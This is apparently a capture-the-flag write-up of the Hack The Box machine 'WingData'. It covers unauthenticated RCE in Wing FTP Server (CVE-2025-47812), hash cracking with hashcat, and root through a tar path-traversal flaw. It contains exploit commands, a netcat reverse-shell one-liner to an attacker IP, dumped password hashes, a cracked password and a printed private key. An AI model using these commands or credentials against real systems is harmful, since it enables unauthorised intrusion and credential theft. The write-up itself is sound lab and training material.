---
machineName: WingData
difficulty: Easy
Status: Done
OS: Linux
start_time: 2026-04-27T17:04:00
end_time: 2026-04-27T22:59:00
player_position: "9124"
CVEs:
  - "[CVE-2025-47812](https://nvd.nist.gov/vuln/detail/CVE-2025-47812)"
  - "[CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)"
CWEs:
  - "[CWE-22](http://cwe.mitre.org/data/definitions/22.html)"
  - "[CWE-158](http://cwe.mitre.org/data/definitions/158.html)"
tools:
  - nmap
  - ffuf
  - ZAP
  - hashcat
exploited_programs:
  - WingFTP
  - tar
open_ports:
  - "22"
  - "80"
aliases:
  - Unauthenticated RCE on web server -> lateral movement to another user by cracking hashes stored in previous server -> Privesc through tar path traversal.
tags:
  - "#HTB"
iconurl: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d419202507a3bbf06e764c1c4a524f66.png
---
<div style="text-align: center;">
  <img
    src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d419202507a3bbf06e764c1c4a524f66.png"
    width="200"
  >
</div>

# Initial Recon

## Nmap
```sh
nmap -sV -sC -p- 10.129.244.106                                                               
```
```sh
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-27 17:07 +0200
Nmap scan report for wingdata.htb (10.129.244.106)
Host is up (0.016s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: WingData Solutions
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.64 seconds
```

As always, there’s an http server, with the following login page:
![[images/htb_images/Pasted image 20260427172136.png]]

I quickly capture an attempt to login with **ZAP Proxy**, but nothing jumps to my eyes.
We clearly see this is a version **v7.4.3** for of [Wing FTP Server](https://www.wftpserver.com/)


# First Foothold
I quickly got this [CVE-2025-47812](https://github.com/4m3rr0r/CVE-2025-47812-poc) PoC which opens a path for unauthenticated RCE.

```sh
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -v -c whoami                                                                               
```
```sh
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: 2edd06fa44a591fe98d0dd32a9740501f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 2edd06fa44a591fe98d0dd32a9740501f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
wingftp
----------------------
```

I tried to get a reverse shell running, but there seems to be something blocking this kind of stuff: 

```sh
wafw00f http://ftp.wingdata.htb                                 
```
```sh
                 ?              ,.   (   .      )        .      "
         __        ??          ("     )  )'     ,'        )  . (`     '`
    (___()'`;   ???          .; )  ' (( (" )    ;(,     ((  (  ;)  "  )")
    /,___ /`                 _"., ,._'_.,)_(..,( . )_  _' )_') (. _..( ' )
    \\   \\                 |____|____|____|____|____|____|____|____|____|

                                ~ WAFW00F : v2.4.2 ~
                    ~ Sniffing Web Application Firewalls since 2009 ~

[*] Checking http://ftp.wingdata.htb
[+] Generic Detection results:
[*] The site http://ftp.wingdata.htb seems to be behind a WAF or some sort of security solution
[~] Reason: The server returns a different response code when an attack string is used.
Normal response code is "200", while the response code to cross-site scripting attack is "404"
[~] Number of requests: 5
```

I tried multiple payloads, with base65 and url encoding, but for some reason, this is the one that ended up working:

```sh
 python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -v -c "nc 10.10.15.21 4444 -e /bin/sh" 
```
## 2nd Recon

I launched linpeass as usual, but nothing jumped to my eyes. 
Then I end up poking around, the wingftp server files, and found multiple hashes:

```
admin:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
```

But the only user that was in the `/home` dir was wacky.

We also see this important information here:
```sh
cat 1/users/settings.xml
```
```xml
<EnableSHA256>1</EnableSHA256> 
<EnablePasswordSalting>1</EnablePasswordSalting> 
<SaltingString>WingFTP</SaltingString>
```

So the server is storing files with SHA256 Encryption and with a salt: **WingFTP**


## Privilege Escalation
___

First I started with lateral movement to the user Wacky:
```sh
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wackyhash.txt
```

This part was a pain in the ass, and the main reason I hate brute-forcing passwords, I easily lost like 2 hours, trying to find, rules, combinations, modes, double checking, triple checking, if I was running hashcat correctly, turns out, all I needed was to use the complete rockyou.txt…

```sh
hashcat wackyhash.txt ~/Applications/rockyou.txt -m 1410
```
```
<SNIP>
Dictionary cache built:
* Filename..: /home/drope/Applications/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

Approaching final keyspace - workload adjusted.

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

We get to the **Wacky** through ssh, I didn’t re-run linpeas, as I already did it with the wingftp user.

I found this:
```sh
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

This is clearly the way forward

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()


    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

I tried to trigger this manually, by building a tar with my public ssh key in it, the problem is that the starting path is hard coded, I tried bypassing it wit symlinks,  and relative paths like `~/` and `../../../`, but it obviously didn’t work as the regex is very strict, so i kept searching a bit.
During a recent internship I learned that tar could follow symlinks and extract to weird places. After a lot of searching I stumbled with this [CVE-2025-4517](https://github.com/AzureADTrent/CVE-2025-4517-POC) PoC, and sure enough I just pulled it into the machine and got root!

# Wasted Time
Things I did that didn’t work
___

When I was trying to get an initial foothold:

I managed to get an ssh key
```sh
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -v -c "ls"                                
```
```sh
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls' and username: 'anonymous'
[+] UID extracted: cf2b12c2d21e452cfa443e8aa82186cdf528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: cf2b12c2d21e452cfa443e8aa82186cdf528764d624db129b32c21fbca0cb8d6

--- Command Output ---
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
----------------------

```
```sh
 python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -v -c "cat wftp_default_ssh.key"
```
```sh
[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat wftp_default_ssh.key' and username: 'anonymous'
[+] UID extracted: 7169c3d9b55b55e898f7bb2ab5c9335cf528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 7169c3d9b55b55e898f7bb2ab5c9335cf528764d624db129b32c21fbca0cb8d6

--- Command Output ---
-----BEGIN PRIVATE KEY-----
MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQDZvUZVTlzaXtW6
T2zIW9BYYd9AKP1Wj1ukVn7tGhrd4ISNj0iX6kdw27dSu40lejrpTxntWjx+rZzc
+21c0L8xuyl4Wd7FyRmKzesmdczwcbGL0dJN/4dD03WsIigppA6YnmALzZylybHR
mQgPFA6/CZJp6qSk8ISiUVdo1sL2mvWJKxBofKudUGY46IBFhdwB3ekywlgXH0R+
5OaM3RryqpLf7vFSvxaNWLoYO9AaMlh3MQQE92e4FGyKFwy57sJTY6tjT/JTx5IK
Xk27et4CvfHXDRAd1wmz1im5hhY6oAz1GapM+xf7ii6Fq3YkOoIuBCi9dGPMA+e5
AFRYlztjTirpGkPrkWuk4WNr2NMytjBxUpePKrkgMwBkpBLQ2P8zdEnmLKofBZDq
IfQMq471QeRHlqMce6f0NRj1uw3ctp2VuTDkHueSKmUTgDLMbOYemceeM3xmQ3+w
1L3GmMuHW0Uj+TnFa2uWRhFl3kg9jHPZmCg2YOwg/mW5YPjeib4mhrNjYpsThKTT
4Y7G0qjUhcfld6vI7N5m99NxBwkJ7EaK/0Y1pwwHrM7dS04dEnFmiaG+O059uhsp
ApvCMz4RJjv20nG+WQRl8bH7oHm/Ik3+m22LbURk2tc/dCLdu6b9nWIBuG1lRhby
BIvZ+2jQRRH+bQLgT78f+LdxfFth1QIDAQABAoICAQDT1eFnfSW5DirBaCRdiXXZ
ht68fSR74l02NTCnXI5m7tgHIS9vHO8ETb69LtrTa2eFNP/0e6X/WMkT9Ukg07Yv
m/dsr4KcylmfQVdVw6XvB63Eag5A9CmVQ1VocpLAcGwC75Jh6VhNszzcvhWpFcqC
8b0Qbshf7+AaSyjPRqHHalsXaF4+SYxtMJtDInApM2IoLs2CJLGvTSxGiEwFH9fn
3yul0cHWzzIRshDbItYDppeK3pUaf9jYroYqkuI+wpsspftIU69e8vqSO81EaPU1
lbaDkqHrZhp6bBGL/XgC8VOp4Z5d5qwefQFl6rq15HZibol0SJgPFH2M71UgG4IZ
/6PdyamVfLsCN+z8nkNZOFBeKESSdE/bTAM9JftE/rZWxMfsUgkTUJiJSHeJVX6v
LQ8591mdDixWOn3i/7uxhv9YPEdvQ4siLQUdwYjrDez1hGqIpJYeWoJboN/muDFK
LMgHO/9KuLl7SnD7dryQe6fQvcgbAbQWFtbiiT3NdCSJXdtM0NIWixNJ3ZdTbif/
bd8P9W7U8H4CweABw6NGYLVSTjZETWBoC7+i9z2Yz8eePB53l/9U8V/dGcrmVgAJ
aUCm1WN9AYMYS6m4Vu5uPDGLsA6/QFa+tFwzL+dYO1cZPzX2iyUVvL4Dhuznye++
jrJedPM512x0jaJbIbXMAQKCAQEA8RAG2idFnzbigZeYbt/adQIFXsnB00SGJGSi
jzbog2xW7jg1ofh2ywtyt1p7wX0MkFRJECpwYMIxXC5tqFGIw5te9JOVKj2NR6fT
GxnJMbt2LgL6NJiTobAoSwsfr57ZP3NnNlx9bjB2hL3Mwe8TyKNev8c4bucAbA7W
mn4fnp3mzH7+5uj6F934vzIK7lCFaul81mCpuhHl4LJV5+YoxmN4XiahvcTVX2EM
r8Vv+/y2b+cCS9O0by5NSwTmV+RHMaD+hlZEP3e98gQdy7x5sm2r4yBjTVGReWDR
FYLG0ePffnoYdlLTNfRtwpB+SvCxh1Fz3OGgBYpn432iLGdlZQKCAQEA5ztFgzbM
NVX53dcMvF8s2F2tUJ7930BgINvVcfl6galjUhp8d3ba8Kk1gE9cUB3WyZhRPbx+
NK9EZND5RnRv8o4yrJb3amA/YF19RMH62jHnPjibdIUesNcW0YmB4CYNxWgLgR6m
xs1R+c8sgzrgbtrF2yuCHSEa3+Pr1TB010R9pV8yxrvFJvjAV5z4g2x9hw54OPiY
S5WAQXP2TAU5ZiUqIJtslMhMhzcFxXse/1PN9SAXY3iM1tKXAT3SBjzydEafCtyC
4Xd7SsTI0lXSmIqoihH+XzOmC9mWuoMFG40zfNRLafNhS/4G1vRs4OBpx+YBUKcy
wasyCS9eGoA7sQKCAQBNP06Cz7zetU7GKlb9iJxPjHM+GbcTxUybEuiIrha6Lph4
w+hj2+PtUuDS4prvuOuywF+dX4wdZX09xd775gzGad52z2goXgsM4Dmk4JF5b1IC
ko+tFQuR74op6gmgVG3XiFqVr/O9wKfqB4w6xSr4y2lMWUG7QCkBd4vLfAkT4hOY
ikWSpyulREs2sYmRLppiVSnc5KLe7mdUprEim72LPUrQGN8RmaaqZsYS+VjWTfgE
SemRdOjIC/VWyd4qYgtyWt3VHIXINM3YZPtLUz1IMR64rKNFnpLYa270zrB5h+UR
eXynRglKq+YUSAtAZnrtGuve5ypJPD3oR1UVl5iFAoIBAFviB5s+WSMQiPuICr2H
rFBF2SriIstlz0z/Te++TNndL2RetfrateFPu7zCzFHhqYnuBspbbmMNCkZta8B9
YEaoDqbaTnJs0IJAZBjAZCf0EIl/APbqNunabmzREVS6ilpZH8ktHuR8jgiQNIXp
DWm/cUPIJCnjD8TL0tiiKqunwa3HCGxEDPGRgwzNiUrf/3l9XHR3BD10qMRZihNn
OAnI1taiLCFq/k30pUx1wjl/WaYAHIsgSgbLI8oQgLaN3WIq9ePg//kL+2gYjhxW
khqfbp1+zO+TnHW0/toaWhs6nq0JxvXRCmaiCKG9+s3ZHu+aDAe6iMbAel9//QrW
zeECggEASxx6IAyJRZeVX1SJI/nPDHEh/3JicxScBHCIKTfgTbAi3pntTHOrbCC1
g6Df/7JL4oFLdBunORMGM76XUH9S8V7woxnOZ0Mbf6Q8m3WJ8bW9z73BDcdnLUXZ
Ukskqp6fAqpGBs7TeJTKG8eE8cDsbKTtIGtOa3q+r8aiNBkx04IohYCa2Nc7mJ/j
zDWJEkPgOV4nR/Py8E1ueEn/92eJD1E5jXIeN+BJxibJg5PisB33UfN93ctRgL5L
te49DBgnbe4Ylaf9qfsBjIOhdS6RgBacdVN3+G4ft90miDu8DfPp1LxWTibn7mqP
7wpyB+9adMOI1VJ3lX5hdO3F2Xw4Cg==
-----END PRIVATE KEY-----
----------------------
```

But It didn’t work, it still asked for a password, rejected by ssh.

I also spent a loooong time trying to use the script we saw with `sudo -l`, but with no luck.
And even a longer time trying multiple encryption variations of the sha-256, with multiple wordlists, but it didn’t work, after all it was simply sha-256(pass.salt).